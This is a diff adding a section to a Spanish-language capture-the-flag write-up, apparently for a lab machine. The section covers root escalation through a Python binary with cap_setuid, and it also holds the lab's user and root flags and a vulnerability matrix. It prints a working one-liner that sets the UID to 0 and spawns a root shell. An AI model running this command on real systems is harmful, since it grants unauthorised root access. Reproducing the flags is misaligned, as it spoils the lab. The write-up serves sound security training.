@@ -82,5 +82,26 @@ El binario /usr/bin/python3.8 tiene asignada la capability cap_setuid,cap_net_bi
 
 Explotación y Obtención de Root
 Consultando las técnicas de explotación para Capabilities en GTFOBins, se ejecutó una sentencia en Python para cambiar el ID de usuario a root (UID 0) y desplegar una consola privilegiada:
+
 python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
 
+![escalada de privilegios](images/08-root.png)
+
+Confirmación de privilegios:
+# whoami
+root
+
+Banderas Obtenidas:
+User Flag (user.txt): 72924db756f11370b5c13a940e7e47b6
+Root Flag (root.txt): 6bdfeefc9c2ed60b24bcef59824da63f
+
+4.Matriz de Vulnerabilidades e Impacto
+
+## Matriz de Vulnerabilidades e Impacto
+
+| # | Vulnerabilidad | Clasificación | Impacto |
+|---|---|---|---|
+| **1** | **Insecure Direct Object Reference (IDOR)** | 🔴 **Alta** | Permite a un usuario no autenticado descargar capturas PCAP arbitrarias del servidor. |
+| **2** | **Tráfico no cifrado (FTP en texto plano)** | 🟠 **Media** | Exposición de credenciales de usuario en las capturas de red. |
+| **3** | **Reutilización de Credenciales** | 🟠 **Media** | La clave del servicio FTP fue reutilizada para la administración remota por SSH. |
+| **4** | **Linux Capabilities inseguras (`cap_setuid`)** | 🔴 **Crítica** | Permite a cualquier usuario local escalar privilegios de forma instantánea a `root`. |
